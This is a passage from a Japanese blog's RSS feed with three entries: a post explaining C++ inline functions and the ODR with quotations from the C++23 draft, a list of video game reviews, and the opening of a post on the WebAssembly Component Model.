&lt;p&gt;インライン展開(inline expansion, inline substituion)またはインライン化(inlining)は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;による最適化の一つ。
関数呼び出しを呼び出し先関数の本体で置き換えることにより、関数呼び出しとリターンによるオーバーヘッドを削減する目的で行われる。&lt;/p&gt;

&lt;h2 id=&quot;C23の規格による定義&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt;23の規格による定義&lt;/h2&gt;

&lt;p&gt;inline修飾子は、規格書[1]の9.2.8節で規定されている。&lt;/p&gt;

&lt;p&gt;まず、以下の最初の部分を見ていく。&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;A function declaration (9.3.4.6, 11.4.2, 11.8.4) with an inline specifier declares an inline function. The
inline specifier indicates to the implementation that inline substitution of the function body at the point of
call is to be preferred to the usual function call mechanism. An implementation is not required to perform
this inline substitution at the point of call; however, even if this inline substitution is omitted, the other rules
for inline functions specified in this subclause shall still be respected.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;この箇所は&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;「inline修飾子を付けて宣言した関数のことをinline関数という」&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;「inline関数はインライン展開されることが好ましいが、必ずしもインライン展開されるわけではない」&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;ということを意味している。&lt;/p&gt;

&lt;h2 id=&quot;補足-inline関数とリンカ&quot;&gt;補足: inline関数とリンカ&lt;/h2&gt;

&lt;p&gt;また、本旨から離れるが重要なことで、&lt;strong&gt;「inline修飾子がオブジェクトファイルのリンクに効果を及ぼさない」&lt;/strong&gt;ことも規定されている。(仕様書9.2.8)&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;Note 1 : The inline keyword has no effect on the linkage of a function. In certain cases, an inline function cannot
use names with internal linkage; see 6.6. — end note&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;inline関数はODRの例外という特性上、通常、リンク時に特別扱いを受けることになっている。
inline関数のコードはオブジェクトファイルのCOMDATというセクションに格納され[3]、
これは通常の関数とは異なるセクションである。
そして、リンカは複数のオブジェクトをリンクする際に、それぞれのCOMDATを見て、一つだけ関数定義を取り出して、実行ファイルを作ることで、関数の定義の重複を避けることができる。&lt;/p&gt;

&lt;h2 id=&quot;補足-inline関数とODR&quot;&gt;補足: inline関数とODR&lt;/h2&gt;

&lt;p&gt;inline関数がODRの例外であることは、ややわかりにくい形で書かれている。(仕様書の[basic])&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;For any definable item D with definitions in multiple translation units,&lt;/p&gt;

&lt;p&gt;— if D is a non-inline non-templated function or variable, or&lt;/p&gt;

&lt;p&gt;— if the definitions in different translation units do not satisfy the following requirements,&lt;/p&gt;

&lt;p&gt;the program is ill-formed; a diagnostic is required only if the definable item is attached to a named module
and a prior definition is reachable at the point where a later definition occurs. Given such an item, for all
definitions of D, or, if D is an unnamed enumeration, for all definitions of D that are reachable at any given
program point, the following requirements shall be satisfied.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;この箇所は、inline関数は翻訳ユニット内に複数の定義を持つことが出来るが、各定義が同一でない場合は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;エラーとなることを意味している。&lt;/p&gt;

&lt;h2 id=&quot;References&quot;&gt;References&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;[1] &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt; working draft, &lt;a href=&quot;http://wg21.link/n4950&quot;&gt;http://wg21.link/n4950&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;[2] &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Wikipedia&quot;&gt;Wikipedia&lt;/a&gt;, inlining, &lt;a href=&quot;https://en.wikipedia.org/wiki/Inline_expansion&quot;&gt;https://en.wikipedia.org/wiki/Inline_expansion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;[3] MaskRay, COMDAT and section group, &lt;a href=&quot;https://maskray.me/blog/2021-07-25-comdat-and-section-group&quot;&gt;https://maskray.me/blog/2021-07-25-comdat-and-section-group&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>          <pubDate>Tue, 14 Jan 2025 18:07:27 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6802418398320044128</guid>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/6802418398320044128/1736846477" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>最近遊んだゲーム</title>
          <link>https://tamaron.hatenablog.com/entry/2024/12/24/184445</link>          <description>&lt;p&gt;ここ2年くらいで遊んだゲーム。もう少し前に遊んだものでも特に面白かったやつも記載。&lt;/p&gt;

&lt;h2 id=&quot;ゼルダの伝説-ティアーズ-オブ-ザ-キングダム&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%BC%A5%EB%A5%C0%A4%CE%C5%C1%C0%E2&quot;&gt;ゼルダの伝説&lt;/a&gt; ティアーズ オブ ザ キングダム&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fwww.nintendo.com%2Fjp%2Fzelda%2Ftotk%2Findex.html&quot; title=&quot;ゼルダの伝説　ティアーズ オブ ザ キングダム | Nintendo Switch | 任天堂&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://www.nintendo.com/jp/zelda/totk/index.html&quot;&gt;www.nintendo.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;今まで遊んだゲームの中で間違いなくベストの作品。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%CA%AA%CD%FD%A5%A8%A5%F3%A5%B8%A5%F3&quot;&gt;物理エンジン&lt;/a&gt;が組み込まれているので、物体をくっつけて飛行機を作ったりすることができる。敵を倒して武器とくっつけることで強化できるシステムも面白い。&lt;/p&gt;

&lt;h2 id=&quot;スプラトゥーン3&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B9%A5%D7%A5%E9%A5%C8%A5%A5%A1%BC%A5%F3&quot;&gt;スプラトゥーン&lt;/a&gt;3&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fwww.nintendo.com%2Fjp%2Fswitch%2Fav5ja%2Findex.html&quot; title=&quot;スプラトゥーン3 | Nintendo Switch | 任天堂&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://www.nintendo.com/jp/switch/av5ja/index.html&quot;&gt;www.nintendo.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;麻薬。
&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B9%A5%D7%A5%E9%A5%C8%A5%A5%A1%BC%A5%F3&quot;&gt;スプラトゥーン&lt;/a&gt;をやりすぎてしまうと心が壊れてしまうので、適度に1人用&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/RPG&quot;&gt;RPG&lt;/a&gt;もやると良いと思う。
今年は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%AC%A5%C1%A5%A8%A5%EA%A5%A2&quot;&gt;ガチエリア&lt;/a&gt;でXP2600に到達することができて良かった。
自分が原因で負けることより、味方が原因で負けることのほうが多いので自責思考ができる人向け。&lt;/p&gt;

&lt;h2 id=&quot;Factorio&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Factorio&quot;&gt;Factorio&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fstore.steampowered.com%2Fapp%2F427520%2FFactorio%2F%3Fl%3Djapanese&quot; title=&quot;Steam：Factorio&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://store.steampowered.com/app/427520/Factorio/?l=japanese&quot;&gt;store.steampowered.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;工場系ゲームの王様。
試行錯誤しながらラインを作ったり壊したりして、徐々に複雑な製品を作るのが楽しい。
Space Ageという大型&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/DLC&quot;&gt;DLC&lt;/a&gt;が発売されたが、わかりにくいしUIも良くないし、そこだけ微妙だった。&lt;/p&gt;

&lt;h2 id=&quot;Satisfactory&quot;&gt;Satisfactory&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fstore.steampowered.com%2Fapp%2F526870%2FSatisfactory%2F%3Fl%3Djapanese&quot; title=&quot;Steam で 20% オフ:Satisfactory&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://store.steampowered.com/app/526870/Satisfactory/?l=japanese&quot;&gt;store.steampowered.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;3D版の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/factorio&quot;&gt;factorio&lt;/a&gt;という感じだが、グラフィックやシステム面で&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/factorio&quot;&gt;factorio&lt;/a&gt;と差別化されている。
車や列車を自動運転させたり、アイテムをワープさせたりできて&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/factorio&quot;&gt;factorio&lt;/a&gt;よりも自由度が高いように感じる。&lt;/p&gt;

&lt;h2 id=&quot;GRANBLUE-FANTASY-Relink&quot;&gt;GRANBLUE FANTASY: Relink&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fstore.steampowered.com%2Fapp%2F881020%2FGRANBLUE_FANTASY_Relink%2F&quot; title=&quot;Save 50% on Granblue Fantasy: Relink on Steam&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://store.steampowered.com/app/881020/GRANBLUE_FANTASY_Relink/&quot;&gt;store.steampowered.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;今まで遊んだゲームの中で最もストーリーが良かった。
オンラインで協力プレイをすることができ、モンハン4Gのような魔境になっている。
本家&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B9%A5%DE%A5%DB&quot;&gt;スマホ&lt;/a&gt;ゲーの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B0%A5%E9%A5%D6%A5%EB&quot;&gt;グラブル&lt;/a&gt;をやったことがなかったが楽しめた。&lt;/p&gt;

&lt;h2 id=&quot;ポケットモンスター-スカーレットバイオレット&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%DD%A5%B1%A5%C3%A5%C8%A5%E2%A5%F3%A5%B9%A5%BF%A1%BC&quot;&gt;ポケットモンスター&lt;/a&gt; スカーレット・バイオレット&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fwww.pokemon.co.jp%2Fex%2Fsv%2Fja%2F&quot; title=&quot;トップページ | 『ポケットモンスター スカーレット・バイオレット』公式サイト&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://www.pokemon.co.jp/ex/sv/ja/&quot;&gt;www.pokemon.co.jp&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;今までの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%DD%A5%B1%A5%E2%A5%F3&quot;&gt;ポケモン&lt;/a&gt;の中でストーリーが一番おもしろかった。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%AA%A1%BC%A5%D7%A5%F3%A5%EF%A1%BC%A5%EB%A5%C9&quot;&gt;オープンワールド&lt;/a&gt;で自由にジムにチャレンジできることにはなっているが、実際はレベルの理由で順番が強制されるので自由度は低い。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/DLC&quot;&gt;DLC&lt;/a&gt;もプレイしたが、ストーリーはつまらない。過去作で登場した&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%DD%A5%B1%A5%E2%A5%F3&quot;&gt;ポケモン&lt;/a&gt;を捕まえたいなどの理由がなければやらなくていいと思う。&lt;/p&gt;

&lt;h2 id=&quot;Vampire-Survivors&quot;&gt;Vampire Survivors&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fstore.steampowered.com%2Fapp%2F1794680%2FVampire_Survivors%2F%3Fl%3Djapanese&quot; title=&quot;Steam で 30% オフ:Vampire Survivors&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://store.steampowered.com/app/1794680/Vampire_Survivors/?l=japanese&quot;&gt;store.steampowered.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;Epic storeで無料配布されたのでダウンロードした。
キャラを強化しながら、30分間生き残るゲーム。操作は移動だけで簡単。見た目&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A4%AB%A4%E9%A4%B7&quot;&gt;からし&lt;/a&gt;て舐めていたが、やってみると爽快感があってとても楽しい。武器の強化やキャラ解放などのやり込み要素も多いくて良い。&lt;/p&gt;

&lt;h2 id=&quot;Thronefall&quot;&gt;Thronefall&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fstore.steampowered.com%2Fapp%2F2239150%2FThronefall%2F%3Fl%3Djapanese&quot; title=&quot;Steam で 25% オフ:Thronefall&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://store.steampowered.com/app/2239150/Thronefall/?l=japanese&quot;&gt;store.steampowered.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%BF%A5%EF%A1%BC%A5%C7%A5%A3%A5%D5%A5%A7%A5%F3%A5%B9&quot;&gt;タワーディフェンス&lt;/a&gt;ゲーム。UIはボタンのみでとてもやりやすく、自機を操作でき爽快感もある。
飛行機の中でやるためにSwitchで買ったが、とくに処理落ちもなくプレイできていい感じ。&lt;/p&gt;

&lt;h2 id=&quot;Minecraft&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Minecraft&quot;&gt;Minecraft&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fwww.minecraft.net%2F&quot; title=&quot;Welcome to the official site of Minecraft&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://www.minecraft.net/&quot;&gt;www.minecraft.net&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;数年に一度やりたくなるゲーム。小学生の頃は狂ったようにプレイしてた。
今回はトライアルチャンバーが追加されたので遊んだ。エリトラを入手するまでが大変で、エンドで船を探すのがつらすぎるのでそこだけ改善してほしい。
modも豊富で色んな楽しみ方ができるのも良い。&lt;/p&gt;

&lt;h2 id=&quot;RimWorld&quot;&gt;RimWorld&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fstore.steampowered.com%2Fapp%2F294100%2FRimWorld%2F%3Fl%3Djapanese&quot; title=&quot;Steam で 20% オフ:RimWorld&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://store.steampowered.com/app/294100/RimWorld/?l=japanese&quot;&gt;store.steampowered.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;コロニー&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%B7%D0%B1%C4%A5%B7%A5%DF%A5%E5%A5%EC%A1%BC%A5%B7%A5%E7%A5%F3%A5%B2%A1%BC%A5%E0&quot;&gt;経営シミュレーションゲーム&lt;/a&gt;。遠征して他の国と戦ったり、貿易したりできる。
ロケットを飛ばして、宇宙に脱出するのが目標。楽しすぎて時間が吸われる。
コロニーを複数個設置できないことと操作が忙しすぎて疲れるのがマイナスポイント。&lt;/p&gt;

&lt;h2 id=&quot;ソフィーのアトリエ２-不思議な夢の錬金術士&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%BD%A5%D5%A5%A3%A1%BC%A4%CE%A5%A2%A5%C8%A5%EA%A5%A8&quot;&gt;ソフィーのアトリエ&lt;/a&gt;２ ～不思議な夢の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%CF%A3%B6%E2%BD%D1&quot;&gt;錬金術&lt;/a&gt;士～&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fstore.steampowered.com%2Fapp%2F1621310%2F2%2F%3Fl%3Djapanese&quot; title=&quot;Steam で 50% オフ:ソフィーのアトリエ２ ～不思議な夢の錬金術士～&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://store.steampowered.com/app/1621310/2/?l=japanese&quot;&gt;store.steampowered.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;ライザのアトリエ3と迷っていたが、ライザは過去作も遊ばないと楽しめないというレビューが多かったのでソフィー2にした。ストーリーはそんなに面白くはないが、武器やアイテムの合成が楽しくて、先頭もターン制なのに&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%BF%A5%E9%A5%AF%A5%C6%A5%A3%A5%D6&quot;&gt;インタラクティブ&lt;/a&gt;な感じで良かった。&lt;/p&gt;

&lt;h2 id=&quot;Tales-of-ARISE&quot;&gt;Tales of ARISE&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fstore.steampowered.com%2Fapp%2F740130%2FTales_of_ARISE%2F%3Fl%3Djapanese&quot; title=&quot;Steam で 63% オフ:Tales of ARISE&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://store.steampowered.com/app/740130/Tales_of_ARISE/?l=japanese&quot;&gt;store.steampowered.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%A2%A5%AF%A5%B7%A5%E7%A5%F3RPG&quot;&gt;アクションRPG&lt;/a&gt;のTalesシリーズの最新作。ストーリと戦闘がとても面白い。難易度ハードとノーマルの差が大きすぎるので中間の難易度がほしい。&lt;/p&gt;

&lt;h2 id=&quot;ドラゴンクエストIII-そして伝説へ&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C9%A5%E9%A5%B4%A5%F3%A5%AF%A5%A8%A5%B9%A5%C8III%20%A4%BD%A4%B7%A4%C6%C5%C1%C0%E2%A4%D8%A1%C4&quot;&gt;ドラゴンクエストIII そして伝説へ…&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fwww.dragonquest.jp%2Froto-trilogy%2Fdq3%2F&quot; title=&quot;ドラゴンクエストIII　そして伝説へ… | SQUARE ENIX&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://www.dragonquest.jp/roto-trilogy/dq3/&quot;&gt;www.dragonquest.jp&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C9%A5%E9%A5%AF%A5%A83&quot;&gt;ドラクエ3&lt;/a&gt;は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C9%A5%E9%A5%AF%A5%A8%A5%B7%A5%EA%A1%BC%A5%BA&quot;&gt;ドラクエシリーズ&lt;/a&gt;で最も人気な作品のタイトル。
秋に新幹線に乗ることが多かったので、おもに移動中にプレイした。
音楽やキャ&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%E9%A5%AF&quot;&gt;ラク&lt;/a&gt;ターはもちろん、レトロ感のあるグラフィックが良かった。
レベル上げが大変でストーリークリア後に飽きてしまった。&lt;/p&gt;

&lt;h2 id=&quot;Europa-Universalis-IV&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Europa%20Universalis&quot;&gt;Europa Universalis&lt;/a&gt; IV&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fstore.steampowered.com%2Fapp%2F236850%2FEuropa_Universalis_IV%2F&quot; title=&quot;Save 90% on Europa Universalis IV on Steam&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://store.steampowered.com/app/236850/Europa_Universalis_IV/&quot;&gt;store.steampowered.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;中世ヨーロッパの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B7%A5%DF%A5%E5%A5%EC%A1%BC%A5%B7%A5%E7%A5%F3%A5%B2%A1%BC%A5%E0&quot;&gt;シミュレーションゲーム&lt;/a&gt;。これ系のゲームはUIが複雑でなれるまでがめちゃくちゃつらい。
同盟を組んだり、戦争をしかけたりできるが、AIの難易度がうまく調整されていてとても楽しかった。
しばらく遊んでないと、途中のセーブデータで何やってたか忘れて飽きる。&lt;/p&gt;

&lt;h2 id=&quot;ロマンシング-サガ2-リベンジオブザセブン&quot;&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%ED%A5%DE%A5%F3%A5%B7%A5%F3%A5%B0%20%A5%B5%A5%AC2&quot;&gt;ロマンシング サガ2&lt;/a&gt; リベンジオブザセブン&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fstore.steampowered.com%2Fapp%2F2455640%2F_2%2F&quot; title=&quot;Save 25% on Romancing SaGa 2: Revenge of the Seven on Steam&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://store.steampowered.com/app/2455640/_2/&quot;&gt;store.steampowered.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;途中で詰んでストーリーが進められなくなった。Steamさん、お金返してください。詰まなかったら楽しく遊べてたのになあ。&lt;/p&gt;

&lt;h2 id=&quot;PalWorld&quot;&gt;PalWorld&lt;/h2&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fstore.steampowered.com%2Fapp%2F1623730%2FPalworld%2F&quot; title=&quot;Save 25% on Palworld on Steam&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot; loading=&quot;lazy&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://store.steampowered.com/app/1623730/Palworld/&quot;&gt;store.steampowered.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%DD%A5%B1%A5%E2%A5%F3&quot;&gt;ポケモン&lt;/a&gt;のIPをパクってARKとくっつけたようなゲーム。性格の厳選でやりこみ要素があるらしいが、そこまでは遊ばなかった。世界ランク的なのを上げるために同じ&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%DD%A5%B1%A5%E2%A5%F3&quot;&gt;ポケモン&lt;/a&gt;を何度も捕まえないといけないのが面倒くさすぎた。&lt;/p&gt;
</description>          <pubDate>Tue, 24 Dec 2024 18:44:45 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6802418398314215380</guid>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/6802418398314215380/1735033485" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>Wasm Component ModelとDynamic Linkingの現状</title>
          <link>https://tamaron.hatenablog.com/entry/2024/11/10/195049</link>          <description>&lt;h1 id=&quot;はじめに&quot;&gt;はじめに&lt;/h1&gt;

&lt;h2 id=&quot;背景&quot;&gt;背景&lt;/h2&gt;

&lt;p&gt;WasmのMVP仕様は構造体やタグ付きユニオンのようなリッチな型をサポートしていない。
そのため、外部のWasmモジュールから構造体を受け取るような場合に、その型の表現方法によって相互運用性が失われてしまうことがある。&lt;/p&gt;

&lt;p&gt;Component modelはモジュールの境界を超えてインターフェースとしての型を記述するための仕組み。
